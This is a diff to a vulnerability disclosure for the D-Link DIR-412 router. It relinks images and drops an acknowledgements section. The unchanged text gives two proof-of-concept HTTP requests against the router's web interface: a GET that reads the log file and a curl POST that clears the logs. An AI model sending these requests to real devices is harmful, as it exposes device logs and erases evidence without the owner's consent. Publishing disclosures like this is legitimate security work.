@@ -5,17 +5,7 @@ Vulnerable targets include but are not limited to the lastest firmware versions 
 
 Poc1: http://targetip/log_get.php
 Attackers can get log file by this request.
-![poc1](https://github.com/dahua966/Routers-vuls/blob/master/DIR-412/poc1.png)
+![poc1](poc1.png)
 Poc2: curl -d "act=clear&logtype=sysact" "http://targetip/log_clear.php"
 Attackers can clear log file by this request.
-![poc2](https://github.com/dahua966/Routers-vuls/blob/master/DIR-412/poc2.png)
-#### Acknowledgement
-Thanks to the partners who discovered the vulnerability together：
-
-Jian-bin Ye
-
-Wei Xie
-
-Zhen-hua Wang
-
-En-Ze Wang
+![poc2](poc2.png)
